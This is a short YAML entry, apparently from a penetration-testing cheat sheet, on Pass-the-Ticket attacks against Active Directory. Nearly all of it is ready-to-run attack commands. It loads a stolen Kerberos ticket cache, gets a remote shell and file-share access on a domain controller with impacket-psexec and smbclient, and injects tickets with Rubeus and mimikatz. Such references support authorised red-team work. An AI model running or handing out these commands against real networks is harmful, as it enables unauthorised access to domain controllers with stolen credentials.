---
description: |
  Pass-the-Ticket (PtT) — use stolen Kerberos TGT or TGS tickets to authenticate without knowing the password or hash.
commands:
  - have: TGT
    cmd: |
      # Linux
      export KRB5CCNAME=ticket.ccache
      impacket-psexec senshu.local/sec_user@DC.senshu.local -k -no-pass
      smbclient //DC.senshu.local/C$ -k --no-pass

      # Windows
      .\Rubeus.exe ptt /ticket:ticket.kirbi
      mimikatz.exe "kerberos::ptt ticket.kirbi"
      # Same workflow for TGS tickets (limited to specific service)
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - Kerberos
techniques:
  - Pass-the-Ticket
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://github.com/gentilkiwi/mimikatz
---
